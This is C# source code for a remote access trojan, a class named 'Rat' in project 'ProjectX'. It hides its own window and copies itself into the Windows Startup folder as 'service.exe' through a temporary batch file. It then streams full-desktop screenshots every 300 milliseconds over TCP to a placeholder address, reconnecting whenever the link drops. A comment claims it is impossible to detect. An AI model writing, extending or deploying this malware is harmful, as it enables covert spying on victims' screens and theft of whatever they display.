using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using System.IO;
using System.Threading;
using System.Net.Sockets;
using System.Runtime.Serialization.Formatters.Binary;
using System.Drawing.Imaging;

namespace ProjectX
{
    class Rat : Form
    {
        private Thread t;
        private static string victimIp = "STD_IP";
        private static int victimPort = STD_PORT;

        public static bool HasStarted { get; private set; }

        public Rat()
        {

            Load += Rat_Load;
            Button b = new Button();
            b.Click += B_Click;
            this.Controls.Add(b);
            this.VisibleChanged += Rat_VisibleChanged;
        }

        private void Rat_VisibleChanged(object sender, EventArgs e)
        {
            new Thread(EnableRat).Start();
        }

        private void B_Click(object sender, EventArgs e)
        {
            Visible = false;
        }

        private void Rat_Load(object sender, EventArgs e)
        {
            try
            {
                string s = Directory.GetCurrentDirectory();
                string[] p = s.Split('\\');
                if (p[p.Length - 1].Equals("system32"))
                {
                    goto A;
                }
                string CopyOptions = "copy \"STD_NAME.exe\" \"%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\service.exe\"";
                File.WriteAllText("directive.bat", CopyOptions);
                Thread.Sleep(1000);
                System.Diagnostics.Process.Start("directive.bat");
                Thread.Sleep(3000);
                File.Delete("directive.bat");
            }
            catch (Exception WrongAccess)
            {
                goto A;
            }
        A:
            t = new Thread(SetUpOperations);
            t.Start();
        }
        private void SetUpOperations()
        {
            Invoke(new MethodInvoker(() =>
            {
                this.Visible = false;

            }));
        }
        private void InfiniteLoop()
        {
            int i = 0;
            while (true)
            {
                Thread.Sleep(1000);
                MessageBox.Show("Still running" + i.ToString());
                i++;
            }
        }
        private static void EnableRat()
        {
            Thread t;
        INIT:
            t = new Thread(RatCode);
            t.Start();
            HasStarted = true;
            while (HasStarted)
            {
                if (!t.IsAlive)
                {
                    HasStarted = false;
                }

            }
            goto INIT;

        }
        private static void RatCode()
        {
            TcpClient Client = new TcpClient();
            BinaryFormatter binF = new BinaryFormatter();
            try
            {
                Client.Connect(victimIp, victimPort);
            }
            catch (Exception e)
            {
                //MessageBox.Show(e.Message);
                Thread.Sleep(500); // it doesn't waste resources, impossible to detect
                return;
            }
            NetworkStream mainStream = Client.GetStream();
            try
            {
                while (true)
                {
                    Thread.Sleep(300);
                    binF.Serialize(mainStream, GrabDesktop());
                }
            }
            catch (Exception e)
            {
                //MessageBox.Show(e.Message);
                return;
            }

        }
        private static Image GrabDesktop()
        {
            Rectangle bounds = Screen.PrimaryScreen.Bounds;
            Bitmap screenshot = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
            Graphics graphic = Graphics.FromImage(screenshot);
            graphic.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
            return screenshot;
        }
        [STAThread]
        public static void Main()
        {
            Application.EnableVisualStyles();
            Application.Run(new Rat());
        }
    }
}
